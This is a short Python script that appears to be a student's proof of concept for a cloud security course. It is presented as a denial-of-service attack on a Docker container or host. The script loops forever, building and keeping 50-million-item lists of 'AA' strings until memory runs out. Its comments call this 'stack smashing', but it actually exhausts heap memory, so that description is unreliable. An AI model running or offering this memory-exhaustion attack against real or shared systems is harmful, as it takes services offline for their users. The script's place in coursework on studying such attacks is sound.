#Tanner Lancaster
#Denial of Service: Docker and Host Script
#CSCE 3650 cloud security
# Project Proof of Concept

# stack smashing with appended AA to an empty array with chunk size 50MB
import time
memory_chunk_list = [] #set an empty array 

def dos_RAM(): 
    memory_array = []
    chunk_size = 52428800 # 50 * (1024x1024) = 50MB
    time.sleep(2)
    for i in range(chunk_size):
        memory_array.append("AA") # stack smashing AA string every iteration
        
    return memory_array


while (1):
    time.sleep(1)
    function = dos_RAM()
    time.sleep(2)
    memory_chunk_list.append(function)
    print(f"Denial of Service!")
    




